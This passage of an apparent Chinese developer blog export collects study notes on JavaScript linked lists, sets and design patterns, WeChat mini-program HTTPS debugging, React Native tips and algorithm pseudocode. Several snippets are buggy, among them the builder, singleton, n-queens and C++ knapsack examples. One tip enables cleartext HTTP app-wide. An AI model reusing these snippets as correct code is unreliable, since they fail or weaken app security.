// 根据节点的值查找链表节点
DLink.prototype.find = function (el) &#123;
  var currNode = this.head;
  while (currNode &amp;&amp; currNode.el != el) &#123;
    currNode = currNode.next;
  &#125;
  return currNode;
&#125;

// 插入一个节点
DLink.prototype.insert = function (newEl, oldEl) &#123;
  var newNode = new DNode(newEl);
  var currNode = this.find(oldEl);
  if (currNode) &#123;
    newNode.next = currNode.next;
    newNode.prev = currNode;
    currNode.next = newNode;
  &#125; else &#123;
    throw new Error(&#39;未找到指定要插入节点位置对应的值！&#39;)
  &#125;
&#125;


// 顺序展示链表节点
DLink.prototype.display = function () &#123;
  var currNode = this.head.next;
  while (currNode) &#123;
    console.log(currNode.el);
    currNode = currNode.next;
  &#125;
&#125;

// 查找最后一个节点
DLink.prototype.findLast = function () &#123;
  var currNode = this.head;
  while (currNode.next != null) &#123;
    currNode = currNode.next;
  &#125;
  return currNode;
&#125;

// 逆序展示链表节点
DLink.prototype.dispReverse = function () &#123;
  var currNode = this.head;
  currNode = this.findLast();
  while (currNode.prev != null) &#123;
    console(currNode.el);
    currNode = currNode.prev;
  &#125;
&#125;

// 删除给定的节点
DLink.prototype.remove = function (el) &#123;
  var currNode = this.find(el);
  if (currNode &amp;&amp; currNode.next != null) &#123;
    currNode.prev.next = currNode.next;
    currNode.next.prev = currNode.prev;
    currNode.next = null;
    currNode.previous = null;
  &#125; else &#123;
    throw new Error(&#39;找不到要删除对应的节点&#39;);
  &#125;
&#125;</code></pre>
<h3 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h3><pre><code class="javascript">// 循环链表构造函数
function CLink() &#123;
  this.head = new Node(&#39;head&#39;);
  this.head.next = this.head;
&#125;

// 向循环链表结尾新增一个节点
CLink.prototype.append = function (el) &#123;
  var currNode = this.head;
  while (currNode.next != null &amp;&amp; currNode.next != this.head) &#123;
    currNode = currNode.next;
  &#125;
  var newNode = new Node(el);
  newNode.next = currNode.next;
  currNode.next = newNode;
&#125;

// 根据节点的值查找链表节点
CLink.prototype.find = function (el) &#123;
  var currNode = this.head;
  while (currNode &amp;&amp; currNode.el != el &amp;&amp; currNode.next != this.head) &#123;
    currNode = currNode.next;
  &#125;
  return currNode;
&#125;

// 插入一个节点
CLink.prototype.insert = function (newEl, oldEl) &#123;
  var newNode = new Node(newEl);
  var currNode = this.find(oldEl);
  if (currNode) &#123;
    newNode.next = currNode.next;
    currNode.next = newNode;
  &#125; else &#123;
    throw new Error(&#39;未找到指定要插入节点位置对应的值！&#39;);
  &#125;
&#125;

// 展示链表元素节点
CLink.prototype.display = function () &#123;
  var currNode = this.head.next;
  while (currNode &amp;&amp; currNode != this.head) &#123;
    console.log(currNode.el);
    currNode = currNode.next;
  &#125;
&#125;

// 寻找前一个节点
CLink.prototype.findPrev = function (el) &#123;
  var currNode = this.head;
  while (currNode.next &amp;&amp; currNode.next.el !== el) &#123;
    currNode = currNode.next;
  &#125;
  return currNode;
&#125;

// 删除给定的节点
CLink.prototype.remove = function (el) &#123;
  var prevNode = this.findPrev(el);
  if (prevNode.next != null) &#123;
    prevNode.next = prevNode.next.next;
  &#125; else &#123;
    throw new Error(&#39;找不到要删除的节点&#39;);
  &#125;
&#125;</code></pre>
<h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><pre><code class="javascript">class Collection &#123;
  constructor(data) &#123;
    this.collection = new Set(data);
  &#125;

  add(data) &#123;
    this.collection.add(data);
  &#125;

  get() &#123;
    return this.collection;
  &#125;

  remove(data) &#123;
    this.collection.remove(data);
  &#125;

  has(data) &#123;
    return this.collection.has(data);
  &#125;

  size() &#123;
    return this.collection.size;
  &#125;

  values() &#123;
    return this.collection;
  &#125;

  union(collection) &#123;
    let arr1 = Array.from(collection);
    let arr2 = Array.from(this.collection);
    return new Set(arr1.concat(arr2));
  &#125;

  intersect(collection) &#123;
    let arr = new Set();
    this.collection.forEach(element =&gt; &#123;
      if (collection.has(element)) &#123;
        arr.add(element);
      &#125;
    &#125;);
    return arr;
  &#125;

  difference(collection) &#123;
    let arr = new Set();
    this.collection.forEach(element =&gt; &#123;
      if (!collection.has(element)) &#123;
        arr.add(element);
      &#125;
    &#125;);
    return arr;
  &#125;

  sub(collection) &#123;
    if (this.size() &lt; collection.size()) &#123;
      return false;
    &#125; else &#123;
      let res = true;
      collection.values().forEach(element =&gt; &#123;
        if (!this.collection.has(element)) &#123;
          res = false;
        &#125;
      &#125;);
      return res;
    &#125;
  &#125;
&#125;</code></pre>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<p><a href="https://juejin.im/post/59ac1c4ef265da248e75892b#heading-6">js 深拷贝 vs 浅拷贝</a></p>
</blockquote>
<blockquote>
<p><a href="https://juejin.im/post/5d6aa4f96fb9a06b112ad5b1">如何写出一个惊艳面试官的深拷贝?</a></p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>算法</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - 设计模式</title>
    <url>/2020/02/29/design-pattern-note/</url>
    <content><![CDATA[<p>摘录<code>JavaScript</code>常用设计模式，其实这些平时有意无意都在使用，借着面试机会整理一下。</p>
<span id="more"></span>

<h1 id="行为类"><a href="#行为类" class="headerlink" title="行为类"></a>行为类</h1><h3 id="发布-订阅模式-Publish-Subscribe"><a href="#发布-订阅模式-Publish-Subscribe" class="headerlink" title="发布-订阅模式 Publish-Subscribe"></a>发布-订阅模式 Publish-Subscribe</h3><pre><code class="javascript"></code></pre>
<h1 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h1><h3 id="构造器模式-Constructor"><a href="#构造器模式-Constructor" class="headerlink" title="构造器模式 Constructor"></a>构造器模式 Constructor</h3><p>类似于面向对象中的构造器，由于ES5中没有很好的对象概念，现以函数的形式模拟，本质一样。</p>
<pre><code class="javascript">// ES5

function Student(name, gender) &#123;
  this.name = name;
  this.gender = gender
  this.print = function () &#123;
    console.log(&#39;姓名:&#39; + this.name + &#39;性别:&#39; + this.gender);
  &#125;
&#125;

var zhaoo = new Student(&#39;小兆&#39;, &#39;male&#39;);
var pp = new Student(&#39;小欣&#39;, &#39;female&#39;);

zhaoo.print();
pp.print();</code></pre>
<pre><code class="javascript">// ES6

class Student &#123;
  constructor(name, gender) &#123;
    this.name = name;
    this.gender = gender;
  &#125;

  print = () =&gt; &#123;
    console.log(`姓名:$&#123;this.name&#125;性别:$&#123;this.gender&#125;`);
  &#125;
&#125;

const zhaoo = new Student(&#39;小兆&#39;, &#39;male&#39;);
const pp = new Student(&#39;小欣&#39;, &#39;female&#39;);

zhaoo.print();
pp.print();</code></pre>
<h3 id="原型模式-Prototype"><a href="#原型模式-Prototype" class="headerlink" title="原型模式 Prototype"></a>原型模式 Prototype</h3><p>之前对象中，每创建一个实例，内部都会实例化一份<code>print</code>函数，造成资源浪费。现使用<code>prototype</code>构造对象原型，相当于对<code>print</code>函数的一个引用，进行了优化。</p>
<pre><code class="javascript">// ES5

function Student(name, gender) &#123;
  this.name = name;
  this.gender = gender
&#125;

Student.prototype.print = function () &#123;
  console.log(&#39;姓名:&#39; + this.name + &#39;性别:&#39; + this.gender);
&#125;

var zhaoo = new Student(&#39;小兆&#39;, &#39;male&#39;);
var pp = new Student(&#39;小欣&#39;, &#39;female&#39;);

zhaoo.print();
pp.print();</code></pre>
<h3 id="建造者模式-Builder"><a href="#建造者模式-Builder" class="headerlink" title="建造者模式 Builder"></a>建造者模式 Builder</h3><p>在对象外封装一层构建器，作为基层控制者，使用<code>set</code>、<code>get</code>等方法创建获取内部变量。在对象内部可以方便对成员变量进行操纵、校验等操作，更加灵活、规范。</p>
<pre><code class="javascript">// ES5

var failCount = 0;

function Student() &#123;&#125;

function StudentBuilder() &#123;
  this.student = new Student();

  StudentBuilder.prototype.setName = function (name) &#123;
    this.student.name = name;
  &#125;

  StudentBuilder.prototype.setScore = function (score) &#123;
    if (typeof score !== Number)
      throw (&#39;score 输入类型错误&#39;);
    this.student.score = score;
  &#125;

  StudentBuilder.prototype.build = function () &#123;
    if (this.student.score &lt; 60)
      failCount++;
    return this.student;
  &#125;
&#125;

var builder = new StudentBuilder();
builder.setName(&#39;小兆&#39;);
builder.setScore(90);
var zhaoo = builder.build();

var builder = new StudentBuilder();
builder.setName(&#39;小欣&#39;);
builder.setScore(59);
var pp = builder.build();

console.log(&#39;挂科人数:&#39; + failCount);</code></pre>
<pre><code class="javascript">// ES6

let failCount = 0;

class Student &#123;&#125;

class StudentBuilder &#123;
  constructor() &#123;
    this.student = new Student();
  &#125;

  setName(name) &#123;
    this.student.name = name;
  &#125;

  setScore(score) &#123;
    if (typeof score !== Number)
      throw (&#39;score 输入类型错误&#39;);
    this.student.score = score;
  &#125;

  build() &#123;
    if (this.student.score &lt; 60)
      failCount++;
    return this.student;
  &#125;
&#125;

const builder = new StudentBuilder();
builder.setName(&#39;小兆&#39;);
builder.setScore(90);
const zhaoo = builder.build();

const builder = new StudentBuilder();
builder.setName(&#39;小欣&#39;);
builder.setScore(59);
const pp = builder.build();

console.log(&#39;挂科人数:&#39; + failCount);</code></pre>
<h3 id="工厂模式-Factory"><a href="#工厂模式-Factory" class="headerlink" title="工厂模式 Factory"></a>工厂模式 Factory</h3><p>包装并返回对象。</p>
<pre><code class="javascript">// ES5

function Student(name, subjects) &#123;
  this.name = name;
  this.subjects = subjects;
&#125;

function factory(name, type) &#123;
  switch (type) &#123;
    case &#39;软件工程&#39;:
      return new Student(name, [&#39;数据结构&#39;, &#39;设计模式&#39;, &#39;算法设计&#39;]);
      break;
    case &#39;城乡规划&#39;:
      return new Student(name, [&#39;城市道路与交通规划&#39;, &#39;村镇规划设计&#39;, &#39;城市建设史与规划史&#39;]);
      break;
    default:
      throw &#39;没这个专业，别瞎填&#39;;
  &#125;
&#125;

var zhaoo = factory(&#39;小兆&#39;, &#39;软件工程&#39;);
var pp = factory(&#39;小欣&#39;, &#39;城乡规划&#39;);</code></pre>
<pre><code class="javascript">// ES6

class Student &#123;
  constructor(name, subjects) &#123;
    this.name = name;
    this.subjects = subjects;
  &#125;
&#125;

const factory = (name, type) =&gt; &#123;
  switch (type) &#123;
    case &#39;软件工程&#39;:
      return new Student(name, [&#39;数据结构&#39;, &#39;设计模式&#39;, &#39;算法设计&#39;]);
      break;
    case &#39;城乡规划&#39;:
      return new Student(name, [&#39;城市道路与交通规划&#39;, &#39;村镇规划设计&#39;, &#39;城市建设史与规划史&#39;]);
      break;
    default:
      throw &#39;没这个专业，别瞎填&#39;;
  &#125;
&#125;

const zhaoo = factory(&#39;小兆&#39;, &#39;软件工程&#39;);
const pp = factory(&#39;小欣&#39;, &#39;城乡规划&#39;);</code></pre>
<h3 id="抽象工程模式-AbstractFactory"><a href="#抽象工程模式-AbstractFactory" class="headerlink" title="抽象工程模式 AbstractFactory"></a>抽象工程模式 AbstractFactory</h3><p>工厂外再包一层工厂，用于上产工厂。</p>
<pre><code class="javascript">function Student() &#123;
  this.intro = &#39;我是个学生&#39;;
&#125;

function Teacher() &#123;
  this.intro = &#39;我是个老师&#39;;
&#125;

function StudentFactory() &#123;
  return new Student();
&#125;

function TeacherFactory() &#123;
  return new Teacher();
&#125;

function Producer(factory) &#123;
  switch (factory) &#123;
    case &#39;student&#39;:
      return StudentFactory;
      break;
    case &#39;teacher&#39;:
      return TeacherFactory;
      break;
    default:
      throw &#39;没这个工厂&#39;;
      break;
  &#125;
&#125;

var sFactory = Producer(&#39;student&#39;);
var zhaoo = factory(&#39;小兆&#39;);
var tFactory = Producer(&#39;teacher&#39;);
var pp = factory(&#39;小潘&#39;);</code></pre>
<h3 id="单例模式-Singleton"><a href="#单例模式-Singleton" class="headerlink" title="单例模式 Singleton"></a>单例模式 Singleton</h3><p>避免重复创建，实例化对象前先判断是已实例化。</p>
<pre><code class="javascript">// ES5

function Singleton() &#123;
  if (Singleton.instance)
    return Singleton.instance;
  else &#123;
    this.countdown = 60;
    Singleton.instance = this;
  &#125;
&#125;

var s1 = new Singleton();
var s2 = new new Singleton();</code></pre>
<pre><code class="javascript">// ES6

class Singleton &#123;
  constructor () &#123;
    if (Singleton.instance)
      return Singleton.instance;
    else &#123;
      this.countdown = 60;
      Singleton.instance = this;
    &#125;
  &#125;
&#125;

const s1 = new Singleton();
const s2 = new new Singleton();</code></pre>
<p>未完待续……</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>小程序真机调试问题</title>
    <url>/2020/02/12/weapp-debug-https/</url>
    <content><![CDATA[<p>微信小程序真机调试中，绑定域名、SSL证书等问题解决方案。</p>
<span id="more"></span>

<p>在真机调试中，不推荐勾选<code>不校验合法域名、web-view、TLS版本以及HTTPS证书</code>，这些问题迟早要面对，还是先解决为好。</p>
<h3 id="配置域名"><a href="#配置域名" class="headerlink" title="配置域名"></a>配置域名</h3><p>小程序中发起远程请求，包括用到的API服务，都需要到<code>微信公众平台</code>配置<code>服务器域名</code>，域名需要开启<code>https</code>，如下：</p>
<p><img  src="https://pic.izhaoo.com/2020021285143.jpg"  ><span class="image-caption">服务器域名配置</span></p>
<h3 id="开发调试"><a href="#开发调试" class="headerlink" title="开发调试"></a>开发调试</h3><p>在<code>体验版</code>、<code>开发板</code>等一些线上调试时，还需要打开<code>开发调试</code>选项，不然请求可能会访问不到。点击右上角<code>···</code>按钮，<code>开发调试</code>，<code>打开调试</code>，弹出绿色的<code>vConsole</code>即可，调试信息也会在里面打印。</p>
<p><img  src="https://pic.izhaoo.com/2020021293503.jpg"  ><span class="image-caption">vConsole</span></p>
<h3 id="本地请求"><a href="#本地请求" class="headerlink" title="本地请求"></a>本地请求</h3><p>真机调试时不允许使用本地域名，如<code>localhost</code>、<code>127.0.0.1</code>这些，但是我们又希望小程序能请求到本地以方便调试。有以下解决方案：</p>
<ol>
<li><p>将<code>本地服务器</code>与<code>调试手机</code>置于同一子网（同一路由器），本地服务器监听地址改为<code>0.0.0.0</code>，小程序请求地址改为本地服务器的内网地址即可，如<code>192.168.31.20</code>，可通过<code>ifconfig / ipconfig</code>查看。</p>
</li>
<li><p><strong>推荐</strong>通过<code>frp</code>、<code>ngrok</code>等软件进行内网穿透，将请求通过绑定域名的服务器（需开启https）进行转发。<code>frp</code>还需使用<code>http2https</code>插件进行重定向，配置本地证书。</p>
</li>
</ol>
<h3 id="证书错误"><a href="#证书错误" class="headerlink" title="证书错误"></a>证书错误</h3><p>小程序对SSL证书的要求较高，许多免费的证书达不到要求，可以多试几家。本人测试，<code>宝塔面板</code>、<code>阿里云</code>无法使用，<code>腾讯云</code>可以使用。</p>
<p>我的项目使用了<code>GraphQL</code>查询接口，用到了<code>apollo-boost</code>库。真机调试时就是访问不通，catch了错误信息<code>request:fail -202:net::ERR_CERT_AUTHORITY_INVALID</code>，也是证书错误的缘故。</p>
<p><a href="https://myssl.com/">myssl</a>可以在该网站对SSL证书进行评估，一般达到<code>A级</code>以上才能使用，且必须支持<code>TLS 1.2</code>、<code>TLS 1.1</code>、<code>TLS 1.0</code>。在页面下方还可以查看支持访问的设备。</p>
<p><img  src="https://pic.izhaoo.com/2020021293052.jpg"  ><span class="image-caption">支持设备</span></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>ReactNative - 开发笔记</title>
    <url>/2020/01/07/rn-note/</url>
    <content><![CDATA[<p>关于<code>React-Native</code>的一些记录和总结。</p>
<span id="more"></span>

<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><ul>
<li>路由导航：<a href="https://reactnavigation.org/">react-navigation</a></li>
<li>UI组件：<a href="https://react-native-elements.github.io/react-native-elements/">react-native-elements</a></li>
<li>网络请求：<a href="https://github.com/axios/axios">axios</a></li>
<li>状态管理：<a href="https://redux.js.org/">redux</a>、<a href="https://github.com/reduxjs/redux-thunk">redux-thunk</a>、<a href="https://github.com/reduxjs/react-redux">react-redux</a></li>
<li>Icon图标：<a href="https://github.com/oblador/react-native-vector-icons">react-native-vector-icons</a></li>
<li>轮播图：<a href="https://github.com/leecade/react-native-swiper">react-native-swiper</a></li>
<li>支付宝：<a href="https://github.com/0x5e/react-native-alipay">react-native-alipay</a></li>
<li>百度地图：<a href="https://github.com/lovebing/react-native-baidu-map">react-native-baidu-map</a></li>
<li>弹出输入框：<a href="https://github.com/joseestrella89/react-native-dialog-input">react-native-dialog-input</a></li>
<li>HTML渲染：<a href="https://github.com/jsdf/react-native-htmlview">react-native-htmlview</a></li>
<li>欢迎页：<a href="https://github.com/Jacse/react-native-app-intro-slider">react-native-app-intro-slider</a></li>
<li>日期时间选择：<a href="https://github.com/react-native-community/react-native-datetimepicker">datetimepicker</a></li>
<li>Fab按钮：<a href="https://github.com/mastermoo/react-native-action-button">react-native-action-button</a></li>
<li>组件相对路径：<a href="https://github.com/entwicklerstube/babel-plugin-root-import">babel-plugin-root-import</a></li>
</ul>
<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><h5 id="本地请求失败"><a href="#本地请求失败" class="headerlink" title="本地请求失败"></a>本地请求失败</h5><p>在请求本地服务器<code>http://127.0.0.1:7001</code>的时候怎么也访问不到。后来才了解到原来使用<code>Android Studio</code>虚拟机，需要访问<strong><a href="http://10.0.2.2:28080">http://10.0.2.2:28080</a></strong>，相当于开了两台局域网主机嘛。</p>
<blockquote>
<p><a href="https://stackoverflow.com/questions/42189301/axios-in-react-native-not-calling-server-in-localhost"><a href="https://stackoverflow.com/questions/42189301/axios-in-react-native-not-calling-server-in-localhost">Axios (in React-native) not calling server in localhost</a></a></p>
</blockquote>
<blockquote>
<p><a href="https://github.com/axios/axios/issues/973">Axios doesn’t work with Android (emulator) raising a Network Error</a></p>
</blockquote>
<h5 id="导航标题不居中"><a href="#导航标题不居中" class="headerlink" title="导航标题不居中"></a>导航标题不居中</h5><p><code>react-navigation</code>标题在安卓上默认显示在左边，想在左边做一个回退按钮，按照官方文档设置了标题居中，并没有起效果。解决方案如下：</p>
<pre><code class="javascript">static navigationOptions = &#123; 
    headerTitleStyle:&#123;
        flex: 1,
        textAlign: &#39;center&#39;,
    &#125;, 
&#125;</code></pre>
<blockquote>
<p><a href="https://www.cnblogs.com/alex-huanglintian/p/8641255.html"><a href="https://www.cnblogs.com/alex-huanglintian/p/8641255.html">react-navigation 标题在安卓上不居中问题</a></a></p>
</blockquote>
<h5 id="打包无法联网"><a href="#打包无法联网" class="headerlink" title="打包无法联网"></a>打包无法联网</h5><p>安卓9开始需要添加配置才能开启联网权限。解决方案如下：</p>
<ol>
<li><p>在<code>/src/main/res</code>创建<code>network_security_config.xml</code>文件，内写代码：</p>
<pre><code class="xml">      &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
    &lt;network-security-config&gt;
        &lt;base-config cleartextTrafficPermitted=&quot;true&quot; /&gt;
    &lt;/network-security-config&gt;</code></pre>
</li>
<li><p>在<code>/src/main/androidManifest.xml</code>加入如下代码：</p>
<pre><code class="xml">&lt;application
    android:name=&quot;.MainApplication&quot;
    android:label=&quot;@string/app_name&quot;
    android:icon=&quot;@mipmap/ic_launcher&quot;
    android:networkSecurityConfig=&quot;@xml/network_security_config&quot;    //Add
    android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;
    android:allowBackup=&quot;false&quot;
    android:theme=&quot;@style/AppTheme&quot;&gt;</code></pre>
</li>
</ol>
<blockquote>
<p><a href="https://blog.csdn.net/qq_36538734/article/details/90476288">react native 0.595 在安卓9.0版 release包无法联网</a></p>
</blockquote>
<h5 id="支付宝开启沙箱"><a href="#支付宝开启沙箱" class="headerlink" title="支付宝开启沙箱"></a>支付宝开启沙箱</h5><p>开发支付业务时用到的第三方封装支付宝插件，但是没有集成沙箱环境，按以下方式集成。</p>
<ol>
<li><p><code>android/src/main/java/com/reactlibrary/AlipayModule.java</code>中添加以下代码：</p>
<pre><code class="java">package com.reactlibrary;

import com.alipay.sdk.app.EnvUtils;    //Add
import com.alipay.sdk.app.H5PayCallback;
import com.alipay.sdk.util.H5PayResultModel;
import com.alipay.sdk.app.AuthTask;

public void run() &#123;
    thread.start();
&#125;

// Add
@ReactMethod
public void setAlipaySandbox(Boolean isSandbox) &#123;
  if(isSandbox)&#123;
    EnvUtils.setEnv(EnvUtils.EnvEnum.SANDBOX);
  &#125;else &#123;
    EnvUtils.setEnv(EnvUtils.EnvEnum.ONLINE);
  &#125;
&#125;

@ReactMethod
public void pay(final String orderInfo, final Promise promise) &#123;
  Runnable runnable = new Runnable() &#123;</code></pre>
</li>
<li><p><code>index.d.ts</code>中添加以下代码：</p>
<pre><code class="java">function authWithInfo(infoStr: string): IResult;

// Add
function setAlipaySandbox(isSandbox: boolean): void

function pay(infoStr: string): IResult;

function payInterceptorWithUrl(infoStr: string): &#123;</code></pre>
</li>
</ol>
<blockquote>
<p><a href="https://github.com/0x5e/react-native-alipay/pull/40/commits/36a7347c6e9ca1cbd3457c7ef93d620448bb9f29">add sandbox</a></p>
</blockquote>
<h3 id="组件导入相对路径配置"><a href="#组件导入相对路径配置" class="headerlink" title="组件导入相对路径配置"></a>组件导入相对路径配置</h3><p>安装并配置插件<code>babel-plugin-root-import</code>即可。</p>
<pre><code class="javascript">yarn add babel-plugin-root-import    // 下载插件

plugins: [    // 加入 babel.config.js 配置
    [
      &#39;babel-plugin-root-import&#39;,
      &#123;
        rootPathSuffix: &#39;src&#39;,
      &#125;,
    ],
  ],</code></pre>
<h3 id="获取sha1"><a href="#获取sha1" class="headerlink" title="获取sha1"></a>获取sha1</h3><p>在使用 <a href="https://github.com/lovebing/react-native-baidu-map">react-native-baidu-map</a> 过程中，发现 <code>reverseGeoCode</code> 等一些功能无法使用，且在RN控制台没有报错。</p>
<p>后来在 <code>Android Studio</code> 打包时发现原生模块报错，原来是 <code>百度地图SKD</code> 中的 <strong>开发版sha1</strong> 和 <strong>发布版sha1</strong> 没有配置正确。</p>
<p><img  src="https://pic.izhaoo.com/20200509114652.jpg"  ><span class="image-caption">百度地图bug</span></p>
<p>获取方法如下:</p>
<pre><code class="bash">$ cd ./android/app</code></pre>
<p>可以看到 <code>debug.keystore</code> 和 <code>release.keystore</code> 签名文件。（具体文件名可能不同）</p>
<pre><code class="bash">keytool -list -v -keystore debug.keystore  #获取开发版sha1</code></pre>
<p><img  src="https://pic.izhaoo.com/20200509153325.png"  ><span class="image-caption">开发版sha1</span></p>
<p>提示 <code>输入秘钥库密码</code> ，直接回车，即可获取 <code>开发版sha1</code>。</p>
<p><code>发布版sha1</code> 同理:</p>
<pre><code class="bash">keytool -list -v -keystore release.keystore  #获取发布版sha1</code></pre>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记</title>
    <url>/2019/12/28/algorithm-note/</url>
    <content><![CDATA[<p>算法选修课自学笔记。</p>
<span id="more"></span>

<p>&lt;封面摄于浙江·嵊州的四明山，山颠为冰雪覆盖，北欧的感觉。&gt;</p>
<h3 id="分治算法"><a href="#分治算法" class="headerlink" title="分治算法"></a>分治算法</h3><h5 id="线性时间选择"><a href="#线性时间选择" class="headerlink" title="线性时间选择"></a>线性时间选择</h5><p>O(n)</p>
<pre><code class="c++">//随机线性选择（伪代码），O(n)

int partition (Type a[], int p, int r) &#123;
  int i = p, j = r+1
  Type x = a[p]    //第一个元素为基准
  while (true) &#123;
    while (a[++i] &lt; x &amp;&amp; i &lt; r)    //左标兵向右
    while (a[--j] &gt; x)    //右标兵向左
    if (i &gt;= j)
      break
    swap(a[i], a[j])    //交换位置
  &#125;
  a[p] = a[j]    //第一个元素和最小数交换位置
  a[j] = x
  return j    //返回基准位置
&#125;

int randomizedPartition (Type a[], int p, int r) &#123;
  int i = random(p, r)
  swap(a[i], a[p])    //将随机元素作为基准（第一个元素）
  return partition(a, p, r)
&#125;

Type randomizedSelect(Type a[], int p, int r, int k) &#123;    //第k小个元素
  if (p == r)    //只有一个元素
    return a[p]
  int i = randomizedPartition(a, p ,r)    //i为随机基准位置
  j = i-p+1    //计算数组a[p:i]个数（左边）
  if (k &lt;= j)
    return randomizedSelect(a, p, i, k)    //落在左边
  else
    return randomizedSelect(a, i+1, r, k-j)    //落在右边
&#125;</code></pre>
<h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><h5 id="01背包问题"><a href="#01背包问题" class="headerlink" title="01背包问题"></a>01背包问题</h5><p>O(n)</p>
<blockquote>
<p>参考：<a href="https://yq.aliyun.com/articles/714964?spm=a2c4e.11153940.0.0.16233fa9KjyGn1&type=2">算法题之动态规划-01背包问题</a></p>
</blockquote>
<pre><code class="c++">void knapsack(Type v, int w, int c, int n, Type **m) &#123;     //价值，重量，容量，数量，矩阵
  int jMax = min(w[n]-1, c)
    for (int j = 0; j &lt;= jMax; j++)
      m[n][j] = 0
    for (int j = w[n]; j &lt;= c; j++)
      m[n][j] = v[n]
    for (int i = n-1; i &gt; 1; i==) &#123;
      jMax = min(w[i] - 1, c)
      for (int j = 0; j &lt;= jMax; j++)
        m[i][j] = m[i+1][j]
      for (int j =w [i]; j &lt;= c; j++)
        m[i][j] = max(m[1][c], m[2][c-w[1]]+v[i])
      m[1][c] = m[2][c]
      if (c &gt;= w[1])
        m[1][c] = max(m[1][c], m[2][c-w[1]]+v[1])
    &#125;
&#125;</code></pre>
<pre><code class="javascript">// 01背包问题，动态规划，O(n)

var knapsack = &#123;
  getMaxValue: function (weight, value, n, w) &#123;    //各物品重量，各物品价值，物品数量，背包容量
    var table = new Array(n)
    for (var i = 0; i &lt; table.length; i++) &#123;
      table[i] = new Array(w)
      for (var j = 0; j &lt; table[i].length; j++)
        table[i][j] = 0
    &#125;
    for (var i = 1; i &lt; n; i++) &#123;    //物品数量
      for (var j = 1; j &lt; w; j++) &#123;    //背包容量
        if (weight[i] &gt; j)
          table[i][j] = table[i - 1][j]    //装不下(物品价值大于背包容量)
        else
          table[i][j] = Math.max(table[i - 1][j], table[i - 1][j - weight[i]] + value[i])    //装得下(max&#123;装，不装&#125;)
      &#125;
    &#125;
    return table[n-1][w-1]
  &#125;,
  main: function () &#123;
    var weight = new Array(6, 3, 5, 4, 6)
    var value = new Array(2, 2, 6, 5, 4)
    var n = 5,
      w = 10
    return this.getMaxValue(weight, value, n, w)
  &#125;
&#125;
console.log(knapsack.main())</code></pre>
<h3 id="回溯法"><a href="#回溯法" class="headerlink" title="回溯法"></a>回溯法</h3><h5 id="n皇后问题"><a href="#n皇后问题" class="headerlink" title="n皇后问题"></a>n皇后问题</h5><pre><code class="c++">bool place(int t) &#123;
    for (int i; i &lt; t; i++)
    if ((x[i] == x[t]) || (abs(t-i) == abs(x[t]-x[i])))
      return false
  return true
&#125;

void backtrack(int t) &#123;
  if (t &gt; n)
    sum++
  else &#123;
    for (int i; i &lt; n; i++) &#123;
      x[t] = i    //关键
      if (place(t))
        backtrack(t+1)
    &#125;
  &#125;
&#125;</code></pre>
<pre><code class="javascript">//n皇后问题，回溯法

var n = 4
var x = []
function place(t) &#123;    //判断第t个皇后能否放在第i个位置
  var flag = true
  for (var j = 0; j &lt; t; j++) &#123;
    if (x[t] === x[j] || t - j === Math.abs(x[t] - x[j])) &#123;    //判断与竖、撇捺是否有冲突
      flag = false
      break
    &#125;
  &#125;
  return flag
&#125;
function backtrack(t) &#123;
  if (t === n) &#123;    //当前位置到了叶节点输出一个解
    console.log(x)
  &#125; else &#123;
    for (var i = 0; i &lt; n; i++) &#123;
      x[t] = i
      if (place(t)) &#123;
        queen(t + 1)    //不冲突进行下一行搜索
      &#125;
    &#125;
  &#125;
&#125;
backtrack(0)</code></pre>
<h3 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h3><h5 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h5><p>O(n^2)</p>
<p>MST性质（最小生成树定义）：假设G=(V, E)是一个连通网，U 是顶点集V的真子集。若(u, v )是一条具有最小权值的边，其中u∈U， v∈V-U，则必存在一棵包含边(u, v)的最小生成树。</p>
<p>MST性质证明：假设G的任何一颗最小生成树都不含边(u, v)。将边(u, v)添加到G的一颗最小生成树上，将产生含有边(u, v)的圈，并且在这个圈上有一条不同于(u, v)的边(u’, v’)，使得u’∈U，v’∈V-U。将这条边(u’, v’)删去，得到G的另一颗生成树T’。因为c[u][v]&lt;=c[u’][v’]，所以T’的耗费&lt;=T的耗费。于是T’是一颗含有边(u, v)的最小生成树，与原假设矛盾，即证明MST成立。</p>
<pre><code class="c++">void prim(int n, Type **c) &#123;
  Type lowcost[maxint]
  int closet[maxint]
  bool s[maxint]
  s[1] = true
  for (int i = 2; i &lt;= n; i++) &#123;
    lowcost[i] = c[1][i]
    closet[i] = 1
    s[i] = false
  &#125;
  for (int i = 1; i &lt; n; i++) &#123;
    Type min = INF
    int j = 1
    for (int k = 2; k &lt;= n; k++) &#123;
      if ((lowcost[k] &lt; min) &amp;&amp; (!s[k])) &#123;
        min = lowcost[k]
        j = k
      &#125;
    &#125;
    s[j] = true
    for (int k = 2; k &lt;= n; k++) &#123;
      if ((c[j][k] &lt; lowcost(k)) &amp;&amp; (!s[k])) &#123;
        lowcost[k] = c[j][k]
        closet[k] = j
      &#125;
    &#125;
  &#125;
&#125;</code></pre>
<pre><code class="javascript">//最小生成树，prim算法（伪代码）

function prim(int n, int u0, int c[N][N]) &#123;
  s[u0] = true    //第一个点在U内
  //初始化
